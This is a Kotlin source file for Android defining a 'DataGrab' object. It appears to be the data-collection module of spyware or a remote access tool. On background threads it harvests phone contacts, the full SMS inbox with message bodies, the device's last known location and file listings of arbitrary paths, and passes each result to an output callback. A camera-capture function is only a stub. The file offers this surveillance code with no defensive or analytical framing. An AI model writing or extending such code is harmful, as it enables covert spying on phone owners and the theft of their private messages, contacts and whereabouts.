package com.t.core
import android.content.Context
import android.location.LocationManager
import android.net.Uri
import android.provider.ContactsContract
import java.io.File

object DataGrab {
    private fun thread(f: () -> Unit) = Thread(f).start()
    fun contacts(c: Context, out: (String) -> Unit) = thread {
        val sb = StringBuilder("CONTACTS:\n")
        runCatching { c.contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)?.use { cur -> while (cur.moveToNext()) sb.append(cur.getString(cur.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))).append("|").append(cur.getString(cur.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))).append("\n") } }
        out(sb.toString())
    }
    fun sms(c: Context, out: (String) -> Unit) = thread {
        val sb = StringBuilder("SMS:\n")
        runCatching { c.contentResolver.query(Uri.parse("content://sms"), null, null, null, "date DESC")?.use { cur -> while (cur.moveToNext()) sb.append(cur.getString(cur.getColumnIndexOrThrow("address"))).append("|").append(cur.getString(cur.getColumnIndexOrThrow("body"))).append("\n") } }
        out(sb.toString())
    }
    fun loc(c: Context, out: (String) -> Unit) = thread {
        runCatching { val lm = c.getSystemService(LocationManager::class.java); val l = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER) ?: lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER); out("LOC:${l?.latitude},${l?.longitude}") }.onFailure { out("LOC_ERR") }
    }
    fun shoot(c: Context, camId: String, out: (String) -> Unit) = thread { out("CAM_ERR:not implemented fully") }
    fun list(c: Context, path: String, out: (String) -> Unit) = thread { runCatching { val f = File(path); out("FILES:$path\n" + (f.listFiles()?.joinToString("\n") ?: "")) } }
}
